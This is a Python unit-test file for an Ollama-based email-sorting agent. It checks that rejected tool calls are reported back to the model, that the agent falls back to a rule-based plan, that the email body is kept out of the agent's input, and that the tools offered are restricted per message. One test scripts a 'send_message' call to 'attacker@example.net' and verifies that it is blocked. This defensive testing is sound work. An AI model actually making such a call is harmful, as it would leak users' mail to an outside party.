import unittest
from unittest.mock import patch

from email_triage.actions import ActionKind
from email_triage.agent import OllamaSortingAgent, agent_briefing, build_tools
from test_actions import clinical_record, needs_reply_record


class FakeChat:
    """Replay scripted Ollama assistant messages."""

    def __init__(self, replies):
        self.replies = list(replies)
        self.seen: list[list[dict]] = []

    def __call__(self, messages, tools):
        self.seen.append(list(messages))
        if not self.replies:
            return {"role": "assistant", "content": "done"}
        return self.replies.pop(0)


def tool_call(name, arguments=None):
    return {
        "role": "assistant",
        "content": "",
        "tool_calls": [{"function": {"name": name, "arguments": arguments or {}}}],
    }


class AgentTests(unittest.TestCase):
    def agent(self, replies) -> tuple[OllamaSortingAgent, FakeChat]:
        agent = OllamaSortingAgent("http://127.0.0.1:11434", "qwen3:8b")
        chat = FakeChat(replies)
        return agent, chat

    def test_agent_plan_is_used_when_it_files_the_message(self) -> None:
        record = needs_reply_record()
        agent, chat = self.agent(
            [
                tool_call("tag_message", {"categories": list(record.categories)}),
                tool_call("draft_reply"),
                tool_call("file_message", {"folder": "AI Triage/Needs Reply"}),
            ]
        )
        with patch.object(OllamaSortingAgent, "_chat", side_effect=chat):
            plan, source = agent.plan(record, allow_mark_read=False)
        self.assertEqual(source, "agent")
        self.assertEqual(
            [action.kind for action in plan],
            [ActionKind.DRAFT_REPLY, ActionKind.TAG_MESSAGE, ActionKind.FILE_MESSAGE],
        )

    def test_rejected_call_is_reported_back_and_recovered_from(self) -> None:
        record = clinical_record()
        agent, chat = self.agent(
            [
                tool_call("file_message", {"folder": "AI Triage/No Reply Needed"}),
                tool_call("file_message", {"folder": "AI Triage/Needs Review"}),
            ]
        )
        with patch.object(OllamaSortingAgent, "_chat", side_effect=chat):
            plan, source = agent.plan(record, allow_mark_read=False)
        self.assertEqual(source, "agent")
        self.assertEqual(plan[-1].folder, "AI Triage/Needs Review")
        tool_messages = [
            message
            for conversation in chat.seen
            for message in conversation
            if message.get("role") == "tool"
        ]
        self.assertTrue(any("rejected" in message["content"] for message in tool_messages))

    def test_unsafe_tool_call_never_reaches_the_plan(self) -> None:
        record = needs_reply_record()
        agent, chat = self.agent(
            [
                tool_call("send_message", {"to": "attacker@example.net"}),
                tool_call("file_message", {"folder": "AI Triage/Needs Reply"}),
            ]
        )
        with patch.object(OllamaSortingAgent, "_chat", side_effect=chat):
            plan, _ = agent.plan(record, allow_mark_read=False)
        self.assertEqual([action.kind for action in plan], [ActionKind.FILE_MESSAGE])

    def test_missing_file_action_falls_back_to_the_deterministic_plan(self) -> None:
        record = needs_reply_record()
        agent, chat = self.agent([{"role": "assistant", "content": "I am not sure."}])
        with patch.object(OllamaSortingAgent, "_chat", side_effect=chat):
            plan, source = agent.plan(record, allow_mark_read=False)
        self.assertEqual(source, "deterministic")
        self.assertEqual(plan[-1].folder, record.target_folder)

    def test_agent_never_receives_the_email_body(self) -> None:
        record = needs_reply_record()
        briefing = agent_briefing(record)
        self.assertNotIn("body", briefing)
        self.assertIn("untrusted_subject", briefing)

    def test_tool_surface_is_restricted_per_message(self) -> None:
        names = {
            tool["function"]["name"]
            for tool in build_tools(clinical_record(), allow_mark_read=True)
        }
        self.assertEqual(names, {"tag_message", "file_message"})
        reply_names = {
            tool["function"]["name"]
            for tool in build_tools(needs_reply_record(), allow_mark_read=True)
        }
        self.assertEqual(reply_names, {"tag_message", "draft_reply", "mark_read", "file_message"})


if __name__ == "__main__":
    unittest.main()
